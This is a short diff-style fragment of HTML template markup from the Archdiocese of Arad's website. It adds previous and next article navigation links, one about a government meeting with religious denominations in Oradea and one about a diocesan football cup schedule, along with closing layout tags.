+			<a href="https://www.arhiepiscopiaaradului.ro/2024/10/reprezentantii-cultelor-si-ai-statului-s-au-intalnit-la-oradea-guvernul-va-finanta-proiecte-socio-medicale-ale-cultelor/" rel="prev"><span class="meta-nav">Articolul precedent</span>Reprezentanții cultelor și ai statului s-au întâlnit la Oradea: Guvernul va finanța proiecte socio-medicale ale cultelor</a><a href="https://www.arhiepiscopiaaradului.ro/2024/10/programul-campionatului-de-fotbal-cupa-arhiepiscopiei-aradului-editia-a-ii-a-2024/" rel="next"><span class="meta-nav">Articolul următor</span>Programul Campionatului de Fotbal Cupa Arhiepiscopiei Aradului – ediția a II-a 2024</a>			</div><!-- .nav-links -->
+		</nav><!-- .navigation -->
+				</div><!-- #content -->
 	</div><!-- #primary -->
-	</div><!-- #main-content -->
 
     <div id="secondary">
 	
